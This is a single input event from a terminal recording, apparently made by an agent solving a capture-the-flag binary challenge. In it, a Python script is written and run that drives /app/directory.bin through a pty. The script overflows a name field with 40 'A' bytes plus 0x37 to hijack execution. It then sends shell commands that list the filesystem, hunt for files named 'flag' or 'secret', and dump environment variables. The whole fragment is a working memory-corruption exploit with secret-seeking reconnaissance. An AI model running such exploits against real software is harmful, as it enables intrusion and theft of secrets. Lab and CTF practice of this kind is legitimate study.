[2988.469982, "i", "cat << 'EOF' > /tmp/pty_stable.py\nimport pty, os, time, sys\n\npid, fd = pty.fork()\nif pid == 0:\n    os.execv('/app/directory.bin', ['/app/directory.bin'])\nelse:\n    def read_until(token):\n        out = b''\n        while token not in out:\n            try:\n                out += os.read(fd, 1)\n            except: pass\n        return out\n\n    for i in range(9):\n        read_until(b'> ')\n        os.write(fd, b'1\\n')\n        read_until(b'Enter name: \\r\\n')\n        os.write(fd, b'A\\n')\n\n    read_until(b'> ')\n    os.write(fd, b'1\\n')\n    read_until(b'Enter name: \\r\\n')\n    os.write(fd, b'A'*40 + b'\\x37')\n    \n    read_until(b'> ')\n    os.write(fd, b'4\\n')\n    \n    time.sleep(0.5)\n    os.write(fd, b'echo EXPLOIT_SUCCESS; ls -la /; find / -name \"*flag*\" -o -name \"*secret*\" 2>/dev/null; env; exit\\n')\n    time.sleep(1)\n    \n    out = b''\n    while True:\n        try:\n            chunk = os.read(fd, 4096)\n            if not chunk: break\n            out += chunk\n        except: break\n    print(\"\\n--- EXPLOIT SHELL OUTPUT ---\")\n    sys.stdout.buffer.write(out)\nEOF\npython3 /tmp/pty_stable.py\n"]
